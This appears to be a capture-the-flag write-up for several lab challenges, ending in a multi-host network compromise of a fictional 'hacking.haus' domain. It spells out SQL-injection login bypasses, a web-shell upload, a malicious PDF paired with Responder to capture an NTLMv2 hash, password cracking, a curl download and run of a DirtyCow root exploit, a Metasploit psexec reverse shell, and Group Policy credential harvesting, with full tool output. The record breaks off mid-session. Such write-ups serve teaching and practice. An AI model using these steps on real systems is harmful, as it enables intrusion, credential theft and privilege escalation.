# Dysfunctionalglove

Check robots.txt, find flag in text file

Go to /gigantic, go to login, use `' OR 1=1#` to login and anything as the password.
Navigate to Profile and grab flag

XSS on the Wall

bananaramama is admin according to the forum posts

Login as admin with `bananaramama'#` and anything as the password.

The admin panel is now available in the menu bar. Click on it and enter the flag you see.

The file upload has no restrictions. Just upload a web shell.

Find the txt file in the root directory for the last flag

# numberlesslove

Open the file in pcap. See the HTTP request for /GET flag.html.

Right-click on the request and select Follow HTTP Stream.

The request for `flag.html` has a response with the flag.

```http
GET /flag.html HTTP/1.1
Host: 192.168.67.129
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Date: Mon, 19 Feb 2018 23:12:36 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Mon, 19 Feb 2018 23:09:24 GMT
ETag: "52-56598c8ef1f89-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 88
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

<html>
<body>
<h1>flag_{94***********************c}</h1>
</body>
</html
```

# warmsong

Open the pcap in wireshark.

Find the HTTP request for the docx file, and the response.

On the Response, expand the Media Type and then right-click and choose Export Packet Bytes.

Save the bytes as warmsong.docx.

Open the file with a docx reader, grab the flag.

# helpfulwine

Just grab the flag as printable text from the packet contents

# rhetoricalplane

Just grab the flag from the packet, copy as printable text

# tenthcook

Seer python source code

# dramaticlumber

```
RE: dramaticlumber

BACKGROUND
We've received intelligence that indicates the group known as 'hacking.haus' is performing malicious actions on behalf of our adversary. You have been authorized to recon and engage them with any and all means available. Our sources indicate that they have a publicly facing web and mail server. Additionally, one of their members checks his email regularly as he is expecting a pdf from a fellow hacker. Our source says that due to internal policy, they are using Adobe Reader XI 11.0.01. Your goal is to gain Administrator access to their Domain Controller, capturing flags along the way. All boxes have one flag unless the flag file states otherwise. Good luck! NOTE: The IP given on this page is the IP of a Kali jump box to be used for this operation. Feel free to only use it to tunnel through, or use it directly (ssh creds: root:toor CHANGE ASAP!). It has lots of tools in /opt, some may be helpful!
```

root@dramaticlumber-kali:/opt# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
inet 172.30.64.94 netmask 255.255.254.0 broadcast 172.30.65.255
inet6 fe80::250:56ff:feaf:43e prefixlen 64 scopeid 0x20<link>
ether 00:50:56:af:04:3e txqueuelen 1000 (Ethernet)
RX packets 126 bytes 14016 (13.6 KiB)
RX errors 0 dropped 10 overruns 0 frame 0
TX packets 76 bytes 17620 (17.2 KiB)
TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
inet 192.0.2.25 netmask 255.255.255.0 broadcast 192.0.2.255
inet6 fe80::250:56ff:feaf:642f prefixlen 64 scopeid 0x20<link>
ether 00:50:56:af:64:2f txqueuelen 1000 (Ethernet)
RX packets 825 bytes 71725 (70.0 KiB)
RX errors 0 dropped 4 overruns 0 frame 0
TX packets 831 bytes 72121 (70.4 KiB)
TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536
inet 127.0.0.1 netmask 255.0.0.0
inet6 ::1 prefixlen 128 scopeid 0x10<host>
loop txqueuelen 1000 (Local Loopback)
RX packets 2 bytes 78 (78.0 B)
RX errors 0 dropped 0 overruns 0 frame 0
TX packets 2 bytes 78 (78.0 B)
TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0

root@dramaticlumber-kali:/opt# alias ifconfig
alias ifconfig='/usr/bin/grc /sbin/ifconfig'

Use SSH to setup a socks proxy, then use proxy switchy in firefox to be able to access www.hacking.haus

Find an email john@hacking.haus

```
clumber-kali:/opt/Bad-Pdf-master#
python badpdf.py


        ______                 __       _______  ______   ________
        |_   _ \               |  ]     |_   __ \|_   _ `.|_   __  |
          | |_) |  ,--.    .--.| | ______ | |__) | | | `. \ | |_ \_|
          |  __'. `'_\ : / /'`' ||______||  ___/  | |  | | |  _|
         _| |__) |// | |,| \__/  |       _| |_    _| |_.' /_| |_
        |_______/ '-;__/ '.__.;__]     |_____|  |______.'|_____|

        By DeepZec

        =============================================================

Responder detected :/usr/sbin/responder
Please enter Bad-PDF host IP:
192.0.2.25
Please enter output file name:
evil.pdf
Please enter the interface name to listen(Default eth0):
eth1
[*] Starting Process.. [*]
Bad PDF evil.pdf created
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 2.3.3.9

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CRTL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [ON]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [eth1]
    Responder IP               [192.0.2.25]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']



[!] Error starting TCP server on port 25, check permissions or other servers running.
[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : 198.51.100.29
[SMBv2] NTLMv2-SSP Username : HACKING\john
[SMBv2] NTLMv2-SSP Hash     : john::HACKING:75081d46fbdf501d:3C12C5E9476EC16D64CB40773EDAF5E3:0101000000000000C0653150DE09D201CEB2183C496B77D9000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000001000000002000007E7A6280367CDB586BFBC0665432C7C6D2ACE374C1C68F8D038230C5C4A077010A0010000000000000000000000000000000000009001E0063006900660073002F003100390032002E0030002E0032002E0032003500000000000000000000000000
[*] Skipping previously captured hash for HACKING\john
[*] Skipping previously captured hash for HACKING\john
[*] Skipping previously captured hash for HACKING\john
[*] Skipping previously captured hash for HACKING\john
```

Crack the password

```
╭─zoey@nomadic ~/whackzcon
╰─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 john.hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1qaz2wsx         (john)
1g 0:00:00:00 DONE (2020-06-06 13:38) 25.00g/s 102400p/s 102400c/s 102400C/s 123456..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

```
root@dramaticlumber-kali:/opt# nmap mail.hacking.haus
Starting Nmap 7.70 ( https://nmap.org ) at 2020-06-06 16:41 EDT
Nmap scan report for mail.hacking.haus (203.0.113.62)
Host is up, received echo-reply ttl 63 (0.000099s latency).
Not shown: 992 closed ports
Reason: 992 resets
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
25/tcp  open  smtp    syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
110/tcp open  pop3    syn-ack ttl 63
143/tcp open  imap    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
993/tcp open  imaps   syn-ack ttl 63
995/tcp open  pop3s   syn-ack ttl 63
```

```
www-data@www:/var/www$ cat flag.txt
cat flag.txt
859dc5942892b20f503738f0a8576937
There is another flag on this box
```

Run enum

```
www-data@www:/tmp$ curl 192.0.2.25/dirtycow-stable/cowroot -o cowroot
curl 192.0.2.25/dirtycow-stable/cowroot -o cowroot
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to 192.0.2.25 port 80: Connection refused
www-data@www:/tmp$ curl 192.0.2.25/dirtycow-stable/cowroot -o cowroot
curl 192.0.2.25/dirtycow-stable/cowroot -o cowroot
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to 192.0.2.25 port 80: Connection refused
www-data@www:/tmp$ curl 192.0.2.25:8000/dirtycow-stable/cowroot -o cowroot
curl 192.0.2.25:8000/dirtycow-stable/cowroot -o cowroot
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 1246k  100 1246k    0     0  50.0M      0 --:--:-- --:--:-- --:--:-- 50.7M
www-data@www:/tmp$ chmod +x cowroot
chmod +x cowroot
www-data@www:/tmp$ ./cowroot
./cowroot
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
Size of binary: 47032
Racing, this may take a while..
/usr/bin/passwd overwritten
Popping root shell.
Don't forget to restore /tmp/bak
thread stopped
thread stopped
root@www:/tmp# ls -la
ls -la
total 1312
drwxrwxrwt  2 root     root        4096 Jun  6 17:23 .
drwxr-xr-x 22 root     root        4096 Feb 23  2016 ..
prw-r--r--  1 www-data www-data       0 Jun  6 17:23 backpipe
-rwxr-xr-x  1 www-data www-data   47032 Jun  6 17:23 bak
-rwxr-xr-x  1 www-data www-data 1276488 Jun  6 17:22 cowroot
-rw-r--r--  1 www-data www-data    5413 Oct 30  2018 cowroot.c
root@www:/tmp# cd /root
cd /root
root@www:/root# ls -la
ls -la
total 28
drwx------  2 root root 4096 Jul 29  2018 .
drwxr-xr-x 22 root root 4096 Feb 23  2016 ..
-rw-------  1 root root    0 Jul 29  2018 .bash_history
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
-rw-------  1 root root    0 Jul 29  2018 .mysql_history
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-------  1 root root 6207 Jul 29  2018 .viminfo
-r--------  1 root root   33 Jul 29  2018 flag.txt
root@www:/root# cat flag.txt
cat flag.txt
735cc9a11384836d5c222f3c0aa2b5b8
```

nmap 192.168.1.100 with it in DMZ on dd-wrt

```
PORT     STATE SERVICE            REASON          VERSION
80/tcp   open  http               syn-ack ttl 62  Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Did not follow redirect to http://www.hacking.haus/
135/tcp  open  msrpc              syn-ack ttl 126 Microsoft Windows RPC
139/tcp  open  netbios-ssn        syn-ack ttl 126 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds       syn-ack ttl 126 Windows 10 Enterprise N 10240 microsoft-ds (workgroup: HACKING)
3389/tcp open  ssl/ms-wbt-server? syn-ack ttl 126
| ssl-cert: Subject: commonName=DESKTOP-V29745U.hacking.haus
| Issuer: commonName=DESKTOP-V29745U.hacking.haus
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-06-06T02:02:28
| Not valid after:  2020-12-06T02:02:28
| MD5:   d45f bf7d d0f4 0435 d8ca c046 417f c753
|_SHA-1: 27a1 d6ee 48aa ef2a f9aa 007a 5a40 4370 3709 a606
|_ssl-date: 2020-06-07T06:14:25+00:00; +7h00m01s from scanner time.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=6/6%OT=80%CT=1%CU=43999%PV=N%DS=2%DC=T%G=Y%TM=5EDC2358
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10E%TI=Z%CI=RD%II=I%TS=8)OPS
OS:(O1=M5ACST11NW7%O2=M5ACST11NW7%O3=M5ACNNT11NW7%O4=M5ACST11NW7%O5=M5ACST1
OS:1NW7%O6=M5ACST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M5ACNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=41%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=41%CD
OS:=S)

Uptime guess: 0.172 days (since Sat Jun  6 15:07:17 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: DESKTOP-V29745U; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h45m00s, deviation: 3h30m00s, median: 7h00m00s
| smb-os-discovery:
|   OS: Windows 10 Enterprise N 10240 (Windows 10 Enterprise N 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: DESKTOP-V29745U
|   NetBIOS computer name: DESKTOP-V29745U\x00
|   Domain name: hacking.haus
|   Forest name: hacking.haus
|   FQDN: DESKTOP-V29745U.hacking.haus
|_  System time: 2020-06-06T23:14:24-07:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-06-07 02:14:28
|_  start_date: 2020-06-06 22:02:28
```

nmap 192.168.1.101

```
PORT      STATE SERVICE           REASON          VERSION
53/tcp    open  domain?           syn-ack ttl 126
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp    open  http              syn-ack ttl 62  Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Did not follow redirect to http://www.hacking.haus/
88/tcp    open  kerberos-sec      syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2020-06-07 06:17:58Z)
135/tcp   open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn       syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap              syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacking.haus, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds      syn-ack ttl 126 Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HACKING)
464/tcp   open  kpasswd5?         syn-ack ttl 126
593/tcp   open  ncacn_http        syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?          syn-ack ttl 126
3268/tcp  open  ldap              syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacking.haus, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl? syn-ack ttl 126
3389/tcp  open  ms-wbt-server     syn-ack ttl 126 Microsoft Terminal Service
| ssl-cert: Subject: commonName=DC.hacking.haus
| Issuer: commonName=DC.hacking.haus
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-06-06T02:03:13
| Not valid after:  2020-12-06T02:03:13
| MD5:   e8d4 c89d 8861 df1f 8411 9bfd bf42 c23d
|_SHA-1: 4469 4380 b310 ea6e 3a67 3db4 f0f4 77b0 47dc a7f4
|_ssl-date: 2020-06-07T06:20:33+00:00; +7h00m01s from scanner time.
49152/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49153/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49154/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49155/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49157/tcp open  ncacn_http        syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49159/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49167/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.70%I=7%D=6/6%Time=5EDC242A%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=6/6%OT=53%CT=1%CU=39819%PV=N%DS=2%DC=T%G=Y%TM=5EDC24DB
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=I%CI=RD%II=I%SS=O%TS=
OS:7)OPS(O1=M5ACNW8ST11%O2=M5ACNW8ST11%O3=M5ACNW8NNT11%O4=M5ACNW8ST11%O5=M5
OS:ACNW8ST11%O6=M5ACST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M5ACNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=41%W=1680%S=O%A=S+%F=AS%O=M5ACST11NW
OS:1%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
OS:T7(R=Y%DF=Y%T=41%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%U
OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=41%CD=S)

Uptime guess: 0.180 days (since Sat Jun  6 15:02:24 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h45m00s, deviation: 3h30m00s, median: 7h00m00s
| nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:af:8a:b8 (VMware)
| Names:
|   DC<20>               Flags: <unique><active>
|   DC<00>               Flags: <unique><active>
|   HACKING<00>          Flags: <group><active>
|   HACKING<1c>          Flags: <group><active>
|_  HACKING<1b>          Flags: <unique><active>
| smb-os-discovery:
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: DC
|   NetBIOS computer name: DC\x00
|   Domain name: hacking.haus
|   Forest name: hacking.haus
|   FQDN: DC.hacking.haus
|_  System time: 2020-06-06T23:20:33-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-06-07 02:20:33
|_  start_date: 2020-06-06 22:02:41
```

nmap on the webserver to subnet

```
Nmap scan report for DD-WRTx86 (192.168.1.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00030s latency).
Not shown: 1201 closed ports
PORT   STATE SERVICE
23/tcp open  telnet
53/tcp open  domain
80/tcp open  http
MAC Address: 00:50:56:AF:39:CA (Unknown)

Nmap scan report for 192.168.1.100
Host is up (0.000070s latency).
Not shown: 1201 closed ports
PORT    STATE SERVICE
135/tcp open  loc-srv
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:50:56:AF:0A:62 (Unknown)

Nmap scan report for 192.168.1.101
Host is up (0.000072s latency).
Not shown: 1195 closed ports
PORT    STATE SERVICE
53/tcp  open  domain
88/tcp  open  kerberos
135/tcp open  loc-srv
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd
593/tcp open  unknown
636/tcp open  ldaps
MAC Address: 00:50:56:AF:8A:B8 (Unknown)

Initiating Connect Scan at 19:32
Scanning 192.168.1.3 [1204 ports]
Discovered open port 80/tcp on 192.168.1.3
Discovered open port 22/tcp on 192.168.1.3
Discovered open port 8081/tcp on 192.168.1.3
Completed Connect Scan at 19:32, 0.01s elapsed (1204 total ports)
Nmap scan report for 192.168.1.3
Host is up (0.000044s latency).
Not shown: 1201 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8081/tcp open  tproxy
```

Use proxychains and rdesktop with .100 in the DMZ

```
╭─zoey@nomadic ~
╰─$ proxychains rdesktop 198.51.100.29                                                                                                                                                                    130 ↵
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses and invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.

     Issuer: CN=DESKTOP-V29745U.hacking.haus


Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate the connection atempt will be aborted:

    Subject: CN=DESKTOP-V29745U.hacking.haus
     Issuer: CN=DESKTOP-V29745U.hacking.haus
 Valid From: Fri Jun  5 19:02:28 2020
         To: Sat Dec  5 18:02:28 2020

  Certificate fingerprints:

       sha1: 27a1d6ee48aaef2af9aa007a5a4043703709a606
     sha256: 29f283113d0042adf2174119b8c799544b012222cce9914f219f16f86d946477


Do you trust this certificate (yes/no)? yes
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Connection established using SSL.
Protocol(warning): process_pdu_logon(), Unhandled login infotype 1
```

Grab flag.txt from the desktop, credentials in a .txt file `john@hacking.haus:dragon`

the post-exploitation stuff finds credentials in C:\ProgramData\Microsoft\Group Policy\History\{A1C0C41B-D2F8-401B-A5D1-437DA197A809}\Machine\Preferences\Groups
if you do HTB with windows stuff, it's worth going through the C:\ProgramData\Microsoft\Group Policy\... dirs to look for hashes

```
msf exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOST                 198.51.100.29    yes       The target address
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             HACKING          no        The Windows domain to use for authentication
   SMBPass               1qaz2wsx         no        The password for the specified username
   SMBUser               john             no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.0.2.25       yes       The listen address
   LPORT     443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(windows/smb/psexec) > exploit

[*] [2020.06.06-21:59:49] Started reverse TCP handler on 192.0.2.25:443
[*] [2020.06.06-21:59:49] 198.51.100.29:445 - Connecting to the server...
[*] [2020.06.06-21:59:49] 198.51.100.29:445 - Authenticating to 198.51.100.29:445|HACKING as user 'john'...
[*] [2020.06.06-21:59:49] 198.51.100.29:445 - Checking for System32\WindowsPowerShell\v1.0\powershell.exe
[*] [2020.06.06-21:59:49] 198.51.100.29:445 - PowerShell found
[*] [2020.06.06-21:59:49] 198.51.100.29:445 - Selecting PowerShell target
[*] [2020.06.06-21:59:49] 198.51.100.29:445 - Powershell command length: 2392
[*] [2020.06.06-21:59:49] 198.51.100.29:445 - Executing the payload...
[*] [2020.06.06-21:59:49] 198.51.100.29:445 - Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:198.51.100.29[\svcctl] ...
[*] [2020.06.06-21:59:49] 198.51.100.29:445 - Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:198.51.100.29[\svcctl] ...
[*] [2020.06.06-21:59:49] 198.51.100.29:445 - Obtaining a service manager handle...
[*] [2020.06.06-21:59:49] 198.51.100.29:445 - Creating the service...
[+] [2020.06.06-21:59:49] 198.51.100.29:445 - Successfully created the service
[*] [2020.06.06-21:59:49] 198.51.100.29:445 - Starting the service...
[+] [2020.06.06-21:59:49] 198.51.100.29:445 - Service start timed out, OK if running a command or non-service executable...
[*] [2020.06.06-21:59:49] 198.51.100.29:445 - Removing the service...
[+] [2020.06.06-21:59:49] 198.51.100.29:445 - Successfully removed the service
[*] [2020.06.06-21:59:49] 198.51.100.29:445 - Closing service handle...
[*] [2020.06.06-21:59:52] Encoded stage with x86/shikata_ga_nai
[*] [2020.06.06-21:59:52] Sending encoded stage (179808 bytes) to 198.51.100.29
[*] Meterpreter session 1 opened (192.0.2.25:443 -> 198.51.100.29:49846) at 2020-06-06 21:59:53 -0400
[*] AutoAddRoute: Routing new subnet 192.168.1.0/255.255.255.0 through session 1

meterpreter > [-] The 'stdapi' extension has already been loaded.

meterpreter > background
[*] Backgrounding session 1...
msf exploit(windows/smb/psexec) > use post/windows/gather/
Display all 117 possibilities? (y or n)
msf exploit(windows/smb/psexec) > use post/windows/gather/credentials/gpp
msf post(windows/gather/credentials/gpp) > show options

Module options (post/windows/gather/credentials/gpp):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   ALL      true             no        Enumerate all domains on network.
   DOMAINS                   no        Enumerate list of space seperated domains DOMAINS="dom1 dom2".
   SESSION                   yes       The session to run this module on.
   STORE    true             no        Store the enumerated files in loot.

msf post(windows/gather/credentials/gpp) > session -l
[-] Unknown command: session.
msf post(windows/gather/credentials/gpp) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ DESKTOP-V29745U  192.0.2.25:443 -> 198.51.100.29:49846 (192.168.1.100)

msf post(windows/gather/credentials/gpp) > set SESSION 1
SESSION => 1
msf post(windows/gather/credentials/gpp) > set DOMAINS true
DOMAINS => true
msf post(windows/gather/credentials/gpp) > show options

Module options (post/windows/gather/credentials/gpp):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   ALL      true             no        Enumerate all domains on network.
   DOMAINS  true             no        Enumerate list of space seperated domains DOMAINS="dom1 dom2".
   SESSION  1                yes       The session to run this module on.
   STORE    true             no        Store the enumerated files in loot.

msf post(windows/gather/credentials/gpp) > exploit

[*] [2020.06.06-22:08:27] Checking for group policy history objects...
[+] [2020.06.06-22:08:27] Cached Group Policy folder found locally
[*] [2020.06.06-22:08:27] Checking for SYSVOL locally...
[-] [2020.06.06-22:08:27] Error accessing C:\Windows\SYSVOL\sysvol : stdapi_fs_ls: Operation failed: The system cannot find the path specified.
[*] [2020.06.06-22:08:27] Enumerating the user supplied Domain(s): TRUE...
[*] [2020.06.06-22:08:27] Retrieved DC DC.HACKING.HAUS from registry
[*] [2020.06.06-22:08:27] Enumerating DCs for TRUE on the network...
^C[-] [2020.06.06-22:08:51] Post interrupted by the console user
[*] Post module execution completed
msf post(windows/gather/credentials/gpp) > set DOMAINS HACKING DC
DOMAINS => HACKING DC
msf post(windows/gather/credentials/gpp) > show options

Module options (post/windows/gather/credentials/gpp):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   ALL      true             no        Enumerate all domains on network.
   DOMAINS  HACKING DC       no        Enumerate list of space seperated domains DOMAINS="dom1 dom2".
   SESSION  1                yes       The session to run this module on.
   STORE    true             no        Store the enumerated files in loot.

msf post(windows/gather/credentials/gpp) > exploit

[*] [2020.06.06-22:09:10] Checking for group policy history objects...
[+] [2020.06.06-22:09:10] Cached Group Policy folder found locally
[*] [2020.06.06-22:09:10] Checking for SYSVOL locally...
[-] [2020.06.06-22:09:10] Error accessing C:\Windows\SYSVOL\sysvol : stdapi_fs_ls: Operation failed: The system cannot find the path specified.
[*] [2020.06.06-22:09:10] Enumerating the user supplied Domain(s): HACKING, DC...
[*] [2020.06.06-22:09:10] Retrieved DC DC.HACKING.HAUS from registry
[*] [2020.06.06-22:09:10] Enumerating DCs for HACKING on the network...
[+] [2020.06.06-22:09:11] DC Found: DC
